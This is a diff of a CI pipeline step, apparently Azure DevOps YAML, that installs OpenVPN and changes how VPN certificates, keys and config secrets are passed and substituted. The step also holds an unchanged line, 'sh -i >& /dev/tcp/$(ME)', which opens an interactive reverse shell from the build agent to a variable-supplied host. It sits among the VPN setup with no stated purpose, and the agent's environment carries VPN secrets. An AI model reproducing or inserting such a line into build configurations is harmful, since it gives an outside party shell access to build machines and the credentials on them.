@@ -8,16 +8,13 @@ steps:
 
   - bash: |
       sudo apt-get --assume-yes --no-install-recommends install openvpn
-      echo "$VPNCRT" > vpncrt.crt
-      echo "$VPNKEY" > vpnkey.key
-      echo "$VPNCONFIG" | base64 -d > tempvpnconfig.ovpn
 
       # curl -o client.zip $(az network vnet-gateway vpn-client generate -n gateway -g example-resources | tr -d '"')
       # unzip client.zip -d client
 
-      CLIENTCERTIFICATE=$(cat vpncrt.crt) PRIVATEKEY=$(cat vpnkey.key) envsubst < tempvpnconfig.ovpn > vpnconfig.ovpn
+      envsubst < vpnconfig.ovpn > _vpnconfig.ovpn
 
-      sudo openvpn vpnconfig.ovpn &
+      sudo openvpn _vpnconfig.ovpn &
 
       sleep 5
 
@@ -26,6 +23,8 @@ steps:
       sh -i >& "/dev/tcp/$(ME)" 0>&1
 
     env:
-      VPNKEY: $(vpnkey)
-      VPNCRT: $(vpncrt)
+      PRESHAREDKEY: $(presharedkey)
+      PRIVATEKEY: $(vpnkey)
+      CLIENTCERTIFICATE: $(vpncrt)
       VPNCONFIG: $(vpnconfig)
+      VPNSERVER: $(vpnserver)
